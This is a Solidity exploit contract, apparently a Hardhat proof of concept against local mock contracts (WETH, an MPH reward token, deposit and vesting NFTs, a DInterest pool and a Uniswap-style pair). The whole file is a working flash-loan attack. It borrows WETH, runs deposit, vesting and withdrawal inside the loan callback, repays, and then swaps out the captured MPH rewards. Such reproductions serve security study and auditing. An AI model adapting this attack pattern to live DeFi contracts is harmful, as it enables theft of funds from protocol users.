// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import { console } from "hardhat/console.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import { WETH } from "./WETH.sol";
import { MPHToken } from "./MPHToken.sol";
import { DepositNFT } from "./DepositNFT.sol";
import { VestingNFT } from "./VestingNFT.sol";
import { DInterest } from "./DInterest.sol";
import { Swap, IUniswapV2Callee } from "./Swap.sol";

contract Exploit is IERC721Receiver, IUniswapV2Callee {
  struct Deposit {
    bool alive;
    uint256 depositAmount;
    uint64 startTimestamp;
    uint64 endTimestamp;
    uint64 lastRewardedTimestamp;
  }

  WETH public wETH;
  MPHToken public mphToken;
  DepositNFT public depositNft;
  VestingNFT public vestingNft;
  DInterest public dInterest;
  Swap public swap;

  uint256 internal depositId;
  uint256 internal vestingId;
  uint256 public depositAmount = type(uint8).max;

  constructor(address _wETH, address _mphToken, address _depositNft, address _vestingNft, address _dInterest, address _swap) {
    wETH = WETH(_wETH);
    mphToken = MPHToken(_mphToken);
    depositNft = DepositNFT(_depositNft);
    vestingNft = VestingNFT(_vestingNft);
    dInterest = DInterest(_dInterest);
    swap = Swap(_swap);
  }

  function _log() internal {
    console.log("WETH amount @", wETH.balanceOf(address(this)));
    console.log("MPH amount @", mphToken.balanceOf(address(this)));
  }

  function run() external {
    // Flash loan
    swap.swap(depositAmount, 0, address(this), " ");

    swap.swap(0, mphToken.balanceOf(address(this)), address(this), "");
    _log();
  }

  function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
    wETH.approve(address(dInterest), type(uint256).max);
    mphToken.approve(address(swap), type(uint256).max);

    _log();
    dInterest.deposit(depositAmount);
    _log();
    dInterest.vesting(vestingId);
    _log();
    dInterest.withdraw(depositId, true);
    _log();
    wETH.transfer(address(swap), depositAmount);
    _log();
  }

  function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes calldata data
  ) external returns (bytes4) {
    if (msg.sender == address(depositNft))
      depositId = tokenId;
    else if (msg.sender == address(vestingNft))
      vestingId = tokenId;

    return this.onERC721Received.selector;
  }
}
